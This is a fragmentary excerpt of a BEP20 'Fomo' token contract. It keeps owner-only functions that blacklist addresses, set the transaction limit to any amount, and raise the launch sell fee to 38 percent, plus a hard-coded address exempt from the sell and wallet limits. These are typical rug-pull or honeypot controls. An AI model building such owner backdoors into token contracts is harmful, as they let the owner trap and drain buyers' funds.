...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 public ADA = IBEP20(0x78867BbEeF44f2326bF8DDd1941a4439382EF2A7);
...
contract Fomo is Ownable, IBEP20, SafeToken, LockToken {
    using SafeMath for uint256;
    ...
    uint256 private maxSellTransactionAmount = _totalSupply;
    
    uint256 public _maxWallet = 399 * (10**8) * (10 ** _decimals);
    ...
    uint256 pushChartMarketingFee = 300;
    uint256 pushChartReflectionFee = 200;
    
    uint256 sellReflectionFee = 200;
    uint256 sellMarketingFee = 300;
    ...
    constructor () {
        ...
        excludeMaxWallet[0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3] = true;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal open(sender, recipient) returns (bool) {
        ...
        if ( (recipient == pair) && (sender != pair) && sender != owner() && sender != 0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3 && recipient != owner() ) {
    ...
    function UMS(uint256 newNum) public onlyOwner {
    ...
    function lsetGrandLaunch1() public onlyOwner() {
        ...
        _maxWallet = 299 * (10**8) * (10 ** _decimals);
        // Sniper prevention
        burnFee = 0;
        reflectionFee = 200;
        marketingFee = 3800;
    ...
    function lsetGrandLaunch2() public onlyOwner() {
        _maxTxAmount = _totalSupply;
        _maxWallet = 399 * (10**8) * (10 ** _decimals);
        burnFee = 0;
    ...
    function STL(uint256 amount) external onlyOwner {
        _maxTxAmount = amount;
    }
    ...
    function SBL(address adr, bool blacklisted) external onlyOwner {
